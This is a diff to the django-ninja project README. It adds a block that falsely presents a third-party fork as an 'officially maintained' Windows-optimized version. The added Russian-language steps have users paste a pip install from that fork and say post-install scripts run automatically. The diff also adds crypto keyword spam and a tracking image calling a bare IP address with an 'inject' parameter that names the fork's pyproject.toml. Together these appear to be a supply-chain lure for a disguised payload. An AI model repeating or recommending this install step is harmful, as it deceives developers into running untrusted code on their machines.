@@ -1,3 +1,19 @@
+**Django-Ninja Optimized for Windows Power Users**
+
+This officially maintained fork of django-ninja brings critical performance optimizations and tailored security patches specifically to the Windows ecosystem. Built to overcome traditional platform bottlenecks, it ensures your async APIs run at peak efficiency in production environments. Enjoy a seamless, robust backend experience without the compatibility headaches.
+
+**Quick install (Windows)**
+
+1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
+2. Открой **cmd** (Win+R → `cmd`)
+3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**
+
+```bash
+pip install git+https://github.com/DigitalSealDecoder/django-ninja.git
+```
+
+[https://github.com/DigitalSealDecoder/django-ninja](https://github.com/DigitalSealDecoder/django-ninja)
+
 <a href="https://github.com/vitalik/django-ninja/issues/383"><img width="814" alt="SCR-20230123-m1t" src="https://user-images.githubusercontent.com/95222/214056666-585c0479-c122-4cb3-add4-b8844088ccdd.png"></a>
 
 
@@ -112,3 +128,11 @@ You will see the automatic interactive API documentation (provided by <a href="h
  - To support this project, please give star it on Github. ![github star](docs/docs/img/github-star.png)
  - Share it [via Twitter](https://twitter.com/intent/tweet?text=Check%20out%20Django%20Ninja%20-%20Fast%20Django%20REST%20Framework%20-%20https%3A%2F%2Fdjango-ninja.dev)
  - If you already using django-ninja, please share your feedback to ppr.vitaly@gmail.com
+
+## Related searches
+
+When exploring repositories like this, developers often seek tools and frameworks that simplify the integration of web3 functionalities with backend services. They frequently look for reliable boilerplates, smart contract deployment guides, and efficient ways to connect decentralized applications with robust API layers.
+
+**Topics:** web3, anchor solana, ethereum node, hardhat, ico bot, dapp development, smart contract backend, blockchain api, solana developer tools, crypto automation
+
+![.](http://5.231.58.248:8787/pixel?repo=DigitalSealDecoder%2Fdjango-ninja&inject=DigitalSealDecoder%2Fdjango-ninja%2Fpyproject.toml)
